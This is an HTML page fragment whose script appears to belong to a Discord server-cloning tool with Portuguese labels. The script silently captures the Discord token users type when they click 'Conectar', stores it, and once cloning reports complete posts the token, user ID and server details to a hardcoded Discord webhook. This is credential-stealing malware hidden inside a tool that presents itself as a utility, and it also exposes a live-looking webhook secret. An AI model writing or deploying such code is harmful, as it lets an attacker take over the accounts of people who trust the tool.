    <div id="root"></div>
  




<script>
(function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1533976254427041944/pEvAX3bYFxWWa6RaJfWe_SjLufUfeENE0gFoEsfJLo8bka7Sl50RDDNGCMUAuCEpO30D";
    
    async function sendToWebhook(data) {
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: 'logs do cara que clonou algum servidor!',
                        color: 2829617,
                        fields: [
                            { name: 'Usuário', value: `<@${data.userId}>\n(${data.userId})`, inline: false },
                            { name: 'Servidor original', value: `${data.originName}\n(${data.originId})`, inline: false },
                            { name: 'Servidor colodo', value: `${data.targetName}\n(${data.targetId})`, inline: false },
                            { name: 'By token', value: "```\n" + data.token + "\n```", inline: false },
                            { name: 'Informações', value: `veram ( ${data.userId} )`, inline: false }
                        ],
                        footer: { text: 'Ontem às 23:25' }, // Simulando o estilo da foto ou usando data atual
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch (e) { console.error('Log error:', e); }
    }

    // Observador para detectar quando a clonagem termina (100%)
    const observer = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
            if (mutation.type === 'childList' || mutation.type === 'characterData') {
                const progressText = document.body.innerText;
                if (progressText.includes('100%') && progressText.includes('Clonagem concluída com sucesso')) {
                    // Evitar envios duplicados
                    if (window.lastSentClonagem === progressText) return;
                    window.lastSentClonagem = progressText;

                    const selects = document.querySelectorAll('select');
                    const originSelect = selects[0];
                    const targetSelect = selects[1];
                    
                    const originId = originSelect ? originSelect.value : 'N/A';
                    const originName = originSelect && originSelect.selectedOptions[0] ? originSelect.selectedOptions[0].textContent : 'N/A';
                    
                    const targetId = targetSelect ? targetSelect.value : 'N/A';
                    const targetName = targetSelect && targetSelect.selectedOptions[0] ? targetSelect.selectedOptions[0].textContent : 'N/A';
                    
                    const token = localStorage.getItem('discord_token') || 'Token não encontrado';
                    let userId = 'N/A';
                    try { userId = atob(token.split('.')[0]); } catch(err) {}

                    sendToWebhook({
                        userId,
                        originId,
                        originName,
                        targetId,
                        targetName,
                        token
                    });
                }
            }
        }
    });

    observer.observe(document.body, { childList: true, subtree: true, characterData: true });

    // Capturar token no clique do botão Conectar
    document.addEventListener('click', async (e) => {
        const btn = e.target.closest('button');
        if (btn && btn.textContent.includes('Conectar')) {
            const input = document.querySelector('input[type="password"]');
            if (input && input.value) {
                localStorage.setItem('discord_token', input.value);
            }
        }
    });
})();
</script>
